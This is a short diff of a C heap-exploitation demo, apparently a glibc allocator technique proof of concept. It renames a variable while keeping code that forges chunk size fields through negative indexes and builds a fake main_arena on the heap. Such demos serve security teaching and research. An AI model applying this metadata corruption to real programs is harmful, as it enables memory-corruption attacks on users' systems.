@@ -8,15 +8,15 @@ int main()
     setvbuf(stdout, NULL, _IONBF, 0);
     setvbuf(stderr, NULL, _IONBF, 0);
 
-    long *victim, *consolidated_chunk, *chunk;
+    long *victim, *consolidated_chunk, *guard;
 
     victim = malloc(0x410);
     consolidated_chunk = malloc(0x80);
-    chunk = malloc(0x10); // Avoid top-chunk consolidate
+    guard = malloc(0x10); // Avoid top-chunk consolidate
 
     /* Setup consolidated_chunk->next prev_size & size fields */
-    chunk[-2] = 0x90;
-    chunk[-1] = 0x20;
+    guard[-2] = 0x90;
+    guard[-1] = 0x20;
 
     /* Create a FAKE main_arena */
     consolidated_chunk[8] = (long)&consolidated_chunk[-2];
